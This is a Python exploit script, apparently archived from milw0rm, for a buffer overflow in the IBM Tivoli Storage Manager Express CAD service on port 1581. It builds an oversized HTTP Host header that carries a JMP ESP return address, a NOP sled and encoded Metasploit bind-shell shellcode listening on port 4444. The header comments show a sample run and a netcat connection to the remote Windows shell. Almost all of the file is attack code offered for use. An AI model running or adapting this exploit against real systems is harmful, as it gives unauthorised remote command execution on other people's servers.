#!/usr/bin/python
#
# IBM Tivoli Storage Manager Express CAD Service Buffer Overflow (5.3)
# http://www.zerodayinitiative.com/advisories/ZDI-07-054.html
# Tested on windows 2003 server SP0. 
# Coded by Mati Aharoni
# muts.at.offensive-security.com
# http://www.offensive-security.com/0day/dsmcad.py.txt
#
# bt ~ # ./dsmcad.py 192.168.1.107
# [*] IBM Tivoli Storage Manager Express CAD Service Buffer Overflow
# [*] http://www.offensive-security.com
# [*] Connecting to 192.168.1.107
# [*] Sending evil buffer, ph33r
# [*] Check port 4444 for bindshell
#
# bt ~ # nc -v 192.168.1.107 4444
# 192.168.1.107: inverse host lookup failed: Unknown host
# (UNKNOWN) [192.168.1.107] 4444 (krb524) open
# Microsoft Windows [Version 5.2.3790]
# (C) Copyright 1985-2003 Microsoft Corp.
#
# E:\Program Files\Tivoli\TSM\baclient>

import socket
import sys

print "[*] IBM Tivoli Storage Manager Express CAD Service Buffer Overflow"
print "[*] http://www.offensive-security.com"

def usage():
	print "[*] Usage: ./dsmcad.py <host>"
	sys.exit(1)

if len(sys.argv) != 2:
	usage()

buffer="BirdsflyinghighyouknowhowIfeel"
buffer+="SunintheskyyouknowhowIfeel"
buffer+="ReeedsdriftinonbyyouknowhowIfeel"
buffer+="ItsanewdawnItsanewdayItsanewlifeForme"
buffer+="ItsanewdawnItsanewdayItsanewlifeFormeitsanewdawnitsanewdayforme"

buffer+="\x38\x07\xD2\x77"	#77D20738 - FFE4 JMP ESP User32.dll Win2kSp0 EN
buffer+="\x90"*4
buffer+=(
# win32_bind -  EXITFUNC=seh LPORT=4444 Size=696 Encoder=Alpha2 http://metasploit.com */
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x37\x49"
"\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x6a\x61"
"\x58\x50\x30\x41\x31\x42\x41\x6b\x41\x41\x71\x41\x32\x41\x41\x32"
"\x42\x41\x30\x42\x41\x58\x50\x38\x41\x42\x75\x68\x69\x49\x6c\x31"
"\x7a\x68\x6b\x62\x6d\x49\x78\x4b\x49\x39\x6f\x6b\x4f\x39\x6f\x33"
"\x50\x4e\x6b\x52\x4c\x34\x64\x74\x64\x6e\x6b\x42\x65\x67\x4c\x6c"
"\x4b\x41\x6c\x46\x65\x42\x58\x57\x71\x7a\x4f\x6c\x4b\x50\x4f\x65"
"\x48\x4e\x6b\x71\x4f\x51\x30\x37\x71\x58\x6b\x77\x39\x4e\x6b\x75"
"\x64\x4c\x4b\x53\x31\x5a\x4e\x44\x71\x4b\x70\x6f\x69\x6e\x4c\x6c"
"\x44\x69\x50\x42\x54\x45\x57\x4f\x31\x7a\x6a\x36\x6d\x54\x41\x6b"
"\x72\x78\x6b\x69\x64\x47\x4b\x50\x54\x36\x44\x64\x68\x43\x45\x4a"
"\x45\x6e\x6b\x41\x4f\x56\x44\x65\x51\x48\x6b\x75\x36\x6c\x4b\x64"
"\x4c\x50\x4b\x6e\x6b\x71\x4f\x77\x6c\x34\x41\x48\x6b\x53\x33\x66"
"\x4c\x6e\x6b\x4b\x39\x30\x6c\x36\x44\x65\x4c\x51\x71\x4f\x33\x57"
"\x41\x39\x4b\x71\x74\x4c\x4b\x50\x43\x76\x50\x4e\x6b\x41\x50\x54"
"\x4c\x6e\x6b\x32\x50\x45\x4c\x4c\x6d\x6e\x6b\x47\x30\x36\x68\x73"
"\x6e\x32\x48\x6c\x4e\x30\x4e\x56\x6e\x5a\x4c\x56\x30\x6b\x4f\x4b"
"\x66\x71\x76\x62\x73\x31\x76\x45\x38\x74\x73\x76\x52\x71\x78\x63"
"\x47\x63\x43\x76\x52\x31\x4f\x41\x44\x79\x6f\x4e\x30\x65\x38\x58"
"\x4b\x48\x6d\x4b\x4c\x75\x6b\x72\x70\x6b\x4f\x7a\x76\x71\x4f\x6f"
"\x79\x6d\x35\x51\x76\x6c\x41\x58\x6d\x65\x58\x57\x72\x73\x65\x73"
"\x5a\x44\x42\x49\x6f\x6e\x30\x31\x78\x4e\x39\x64\x49\x6a\x55\x4e"
"\x4d\x53\x67\x79\x6f\x6e\x36\x41\x43\x31\x43\x46\x33\x73\x63\x42"
"\x73\x30\x43\x41\x43\x32\x63\x70\x53\x4b\x4f\x38\x50\x43\x56\x71"
"\x78\x74\x51\x33\x6c\x31\x76\x70\x53\x4e\x69\x5a\x41\x4d\x45\x41"
"\x78\x4c\x64\x35\x4a\x30\x70\x6b\x77\x52\x77\x6b\x4f\x6e\x36\x62"
"\x4a\x34\x50\x72\x71\x76\x35\x69\x6f\x4e\x30\x45\x38\x6e\x44\x4c"
"\x6d\x46\x4e\x4d\x39\x46\x37\x59\x6f\x4b\x66\x30\x53\x62\x75\x49"
"\x6f\x38\x50\x63\x58\x6b\x55\x37\x39\x4e\x66\x71\x59\x41\x47\x6b"
"\x4f\x5a\x76\x70\x50\x51\x44\x31\x44\x70\x55\x6b\x4f\x68\x50\x6e"
"\x73\x71\x78\x59\x77\x70\x79\x5a\x66\x71\x69\x66\x37\x6b\x4f\x6a"
"\x76\x52\x75\x4b\x4f\x5a\x70\x71\x76\x31\x7a\x55\x34\x31\x76\x72"
"\x48\x50\x63\x72\x4d\x6f\x79\x78\x65\x53\x5a\x72\x70\x72\x79\x76"
"\x49\x78\x4c\x4b\x39\x4d\x37\x53\x5a\x32\x64\x6d\x59\x6a\x42\x37"
"\x41\x6b\x70\x4b\x43\x4f\x5a\x49\x6e\x63\x72\x56\x4d\x49\x6e\x30"
"\x42\x64\x6c\x6d\x43\x6c\x4d\x62\x5a\x75\x68\x6c\x6b\x6e\x4b\x6e"
"\x4b\x50\x68\x43\x42\x49\x6e\x6c\x73\x62\x36\x69\x6f\x74\x35\x30"
"\x44\x6b\x4f\x48\x56\x53\x6b\x70\x57\x73\x62\x71\x41\x70\x51\x76"
"\x31\x63\x5a\x57\x71\x42\x71\x66\x31\x72\x75\x71\x41\x49\x6f\x68"
"\x50\x75\x38\x4c\x6d\x79\x49\x74\x45\x5a\x6e\x32\x73\x4b\x4f\x6e"
"\x36\x72\x4a\x6b\x4f\x6b\x4f\x50\x37\x79\x6f\x4e\x30\x6e\x6b\x46"
"\x37\x69\x6c\x4f\x73\x69\x54\x52\x44\x49\x6f\x4b\x66\x43\x62\x6b"
"\x4f\x5a\x70\x51\x78\x7a\x50\x4f\x7a\x76\x64\x31\x4f\x33\x63\x4b"
"\x4f\x48\x56\x49\x6f\x48\x50\x61")
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
print "[*] Connecting to "+sys.argv[1]
expl.connect ( ( sys.argv[1], 1581 ) )
print "[*] Sending evil buffer, ph33r"
expl.send ( 'GET /BACLIENT HTTP/1.0\r\nHost: 192.168.1.1 '+ buffer+'\r\n\r\n')
expl.close()
print "[*] Check port 4444 for bindshell"

# milw0rm.com [2007-10-27]
